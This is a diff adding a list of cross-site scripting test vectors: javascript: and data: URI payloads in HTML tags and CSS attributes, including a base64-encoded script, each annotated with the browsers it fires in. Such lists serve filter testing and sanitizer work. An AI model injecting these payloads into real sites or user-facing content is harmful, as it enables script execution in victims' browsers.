@@ -1,0 +1,17 @@
+<table><td background=javascript:alert(12)></td></table>
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(2)</script>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg">
+<iframe src="javascript:alert(1)"> // FF, Chromium, IE8 and Opera
+<embed src="javascript:alert(2)"> // FF, Chromium and Opera
+<embed code="javascript:alert(3)"> // Chromium only
+<img src="javascript:alert(4)"> // Opera 10 and IE6
+<image src="javascript:alert(5)"> // Opera 10 and IE6
+<body background="javascript:alert(5)"> // Opera 10 and IE6
+<script src="javascript:alert(6)"> // Opera 10 and IE6
+<table background="javascript:alert(7)"> // Opera 10 and IE6
+<b style="background:url(javascript:alert('background'))">xxx</b>
+<b style="background-image:url(javascript:alert('background'))">xxx</b>
+<b style="list-style:url(javascript:alert('background'))">xxx</b>
+<b style="list-style-image:url(javascript:alert('background'))">xxx</b>
+
